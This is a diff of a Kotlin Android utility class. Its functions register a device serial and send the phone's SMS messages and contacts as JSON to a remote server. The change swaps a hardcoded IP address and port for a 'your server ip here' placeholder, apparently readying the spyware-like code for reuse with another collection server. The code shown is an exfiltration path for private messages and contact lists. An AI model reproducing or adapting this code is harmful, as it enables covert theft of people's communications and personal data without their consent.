@@ -19,7 +19,7 @@ class NetworkUtils {
         .build()
 
     fun registerSerialNumber(serialNumber: String, callback: (Boolean) -> Unit) {
-        val url = "http://102.165.100.62:47696/api/register"
+        val url = "http://your server ip here:port/api/register"
         val json = "{\"deviceSerial\":\"$serialNumber\"}"
         val requestBody = json.toRequestBody("application/json".toMediaTypeOrNull())
 
@@ -41,7 +41,7 @@ class NetworkUtils {
     }
 
     fun sendSmsAndContacts(serialNumber: String, smsData: String, contactsData: String) {
-        val url = "http://102.165.100.62:47696/api/endpoint"
+        val url = "http://your server ip here:port/api/endpoint"
         val json = createJson(serialNumber, smsData, contactsData)
         val requestBody = json.toRequestBody("application/json".toMediaTypeOrNull())
 
